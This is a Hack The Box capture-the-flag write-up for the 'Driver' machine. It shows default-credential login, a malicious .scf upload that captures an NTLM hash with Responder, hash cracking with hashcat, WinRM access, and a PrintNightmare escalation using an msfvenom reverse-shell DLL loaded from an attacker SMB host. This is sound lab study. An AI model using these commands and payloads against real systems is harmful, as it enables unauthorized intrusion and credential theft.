# Driver Write-up - HTB

## Recon

Starting off with an all port syn scan:

```
sudo nmap -sS -Pn -n -p- 10.10.11.106 -oN all_syn_scan.txt 

#Output:
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

Now taking these and running a full vulnerability scan over it:

```
PORTS=$(grep "open" all_syn_scan.txt | awk -F '/' '{print $1}' | tr '\n' ',' | sed 's/,$//'); sudo nmap -sVC -Pn -n -p $PORTS 10.10.11.106 -oN nmap_svc_scan.txt

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

HTTP and SMB seem to be our enumeration targets.

## Enumeration

### SMB:

Starting off with a quick smbclient null session:

<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

It gets denied. Let's go on HTTP and see what's up.

### HTTP:

We get a login form, our real hekerman instincts type admin:admin and we get access! :dvd:

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Well, after checking the web app, I found that it has upload function.

I checked for upload directory, but nothing. Although there is a clue.

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

## FOOTHOLDING

So, there is someone permanently opening these firmware files we send. I tried various methods with msfvenom and nc, but no shell was coming. So I realized, it must be .scf!

You might ask yourself why scf? Well when someone browses to a directory and a .scf is in it, it automatically reads it. It has been originally designed for Windows 95/98 for shortcut purposes.

So create our malicious .scf file:

```
[Shell]
Command=2
IconFile=\\10.10.X.X\share\icon.ico
```

Turn up Responder:

```
sudo responder -I tun0 -v
```

Upload the file on the web app.

Receive the hash!

<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

Add the hash to a file and load-up hashcat on it:

```
hashcat -m 5600 tony.hash /home/czr/HTB/rockyou.txt
```

<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

Cracked! tony:liltony. Remember WinRM is on, so let's use it to connect.

```
evil-winrm -i 10.10.11.106 -u tony -p liltony
```

<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

## PrivEsc

Checking the powershell history, we can see:

```
cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

Now, let's check Printer Drivers:

```
Get-PrinterDriver | Format-List *
```

<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

Smells like PrintNightmare.

I got this [PoC](https://github.com/cube0x0/CVE-2021-1675).

Craft a payload with msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.8 LPORT=5555 -f dll -o evil.dll
```

Set-up a netcat listener.

Now, turn on smb server:

```
impacket-smbserver share $(pwd) -smb2support
```

Run the PoC:

```
python3 CVE-2021-1675.py 'tony:liltony@10.10.11.106' '\\10.10.16.8\share\evil.dll'
```

Mine threw some errors, but:

<figure><img src="../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>
